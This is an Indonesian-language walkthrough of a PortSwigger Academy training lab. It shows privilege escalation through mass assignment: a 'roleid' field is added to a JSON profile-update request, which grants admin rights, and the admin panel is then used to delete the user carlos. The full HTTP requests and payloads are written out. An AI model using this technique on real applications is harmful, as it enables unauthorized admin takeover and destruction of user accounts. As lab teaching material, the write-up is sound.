# [PortSwigger Academy] Access Control - Lab #4

## 📌 Detail Lab
* **Nama Tantangan:** User role can be modified in user profile
* **Tingkat Kesulitan:** PRACTITIONER
* **Kategori:** Access Control Vulnerabilities
* **Tujuan Lab:** Mengeksploitasi celah modifikasi profil pengguna untuk menaikkan hak akses (*Privilege Escalation*), mengakses panel admin, lalu menghapus akun `carlos`.

---

## 1. Analisis Celah Keamanan (Vulnerability Analysis)
Aplikasi menyediakan fitur bagi pengguna untuk memperbarui informasi profil akun (seperti alamat email). Fitur ini mengirimkan payload JSON ke server backend.

Celah keamanan terjadi karena fungsi pembaruan profil di sisi server **secara membabi buta mengikat (*bind*) seluruh properti JSON yang dikirimkan oleh klien ke dalam objek database pengguna tanpa adanya pembatasan (*whitelisting*)**. Jika penyerang menyisipkan parameter internal terkait peran pengguna (seperti `"roleid": 2`), server akan memperbarui nilai peran tersebut di database, memberikan hak akses administratif kepada pengguna biasa.

---

## 2. Langkah Eksploitasi & Proof of Concept (PoC)

### Analisis Request Pembaruan Profil
1. Login ke aplikasi menggunakan akun biasa yang diberikan (`wiener:peter`).
2. Masuk ke halaman profil akun (`/my-account`).
3. Ubah alamat email (misal: `wiener@normal-user.net`) lalu klik **Update email**.
4. Tangkap request tersebut menggunakan Burp Suite dan kirim ke **Burp Repeater**.

### Menemukan dan Menyuntikkan Parameter Peran (`roleid`)
Perhatikan struktur request pembaruan email dalam format JSON:
```json
{
  "email": "wiener@normal-user.net"
}
```

Perhatikan struktur response yang di berikan dalam format json:
```json
{
  "username": "wiener",
  "email": "hellnah@gmail.com",
  "apikey": "4dGOX1dzgCWwJ5UhHqmEzPSuVfdq7KZc",
  "roleid": 1
}
```

Uji ketersediaan atribut internal dengan menyisipkan parameter roleid ke dalam request payload JSON dan merubah "roleid": 2:
```json
{
  "email": "wiener@normal-user.net",
  "roleid": 2
}
```

Request HTTP final di Burp Repeater:
POST /my-account/change-email HTTP/2
Host: 0a1b008f03c42bebc0723cf600b400da.web-security-academy.net
Content-Type: application/json
Cookie: session=xyz123...
```json
{
  "email": "wiener@normal-user.net",
  "roleid": 2
}
```

### Verifikasi Akses Admin & Eksekusi Target

1. Kirim request tersebut. Server merespons dengan status HTTP 200 OK.
2. Muat ulang halaman /my-account di browser atau periksa respons HTML. Tautan menuju Admin panel 3.kini telah muncul.
3. Buka halaman panel admin:

    URL: /admin

4. Cari akun carlos pada daftar pengguna, lalu klik tombol Delete.

Request HTTP penghapusan user target:
```http
GET /admin/delete?username=carlos HTTP/2
Host: 0a1b008f03c42bebc0723cf600b400da.web-security-academy.net
Cookie: session=xyz123...
```

### Hasil Eksploitasi

Server memproses perintah penghapusan karena sesi pengguna wiener kini telah memiliki nilai roleid: 2 (Admin) di database. Akun carlos berhasil dihapus.

Hasil Akhir: Eskalasi hak akses melalui manipulasi parameter profil berhasil dieksekusi dan lab dinyatakan selesai (Solved).

